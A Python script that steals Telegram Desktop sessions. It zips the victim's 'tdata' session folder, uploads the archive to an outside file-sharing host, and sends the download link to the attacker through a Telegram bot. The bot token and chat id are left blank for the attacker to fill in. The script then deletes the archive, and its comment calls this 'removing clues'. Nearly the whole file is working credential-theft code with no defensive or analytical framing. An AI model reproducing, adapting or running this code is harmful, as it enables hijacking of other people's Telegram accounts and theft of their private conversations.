import zipfile as ZipFile
import os
import requests

# CONFIGURATION PART
botapitoken = '' # Enter your bot HTTP token made with @BotFather
telegramchatid = '' # Enter your telegram chatid (for notifications and files receiving)

try:
    userpath = os.path.expanduser("~")
    requests.get(fr'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text=Hello from {userpath}')  # Sending connection start log to your Telegram DM

    excludedirs = [
        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\dumps',
        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\emoji',
        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\tdummy',
        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\temp',
        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\user_data'
    ]
    targetdir = fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata'

    zippath = fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata.zip'

    def zipdir(dir_path, ziph):
        for root, dirs, files in os.walk(dir_path):
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in excludedirs]
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Adding files
                    ziph.write(file_path, os.path.relpath(file_path, dir_path))
                except Exception as e:
                    # Skipping errors
                    requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={file_path} {e}')

    try:
        with ZipFile.ZipFile(zippath, 'w', ZipFile.ZIP_DEFLATED) as zipf:
            zipdir(targetdir, zipf)
    except Exception as e:
        requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={e}')

    # Uploading
    with open(zippath, 'rb') as file:
        response = requests.post('https://kappa.lol/api/upload', files={'file': file})

    requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={response.json().get("link")}\n{response.json().get("delete")}')  # Files arriving to Telegram DM
    os.remove(zippath)  # Removing clues

except Exception as e:
    requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={e}')
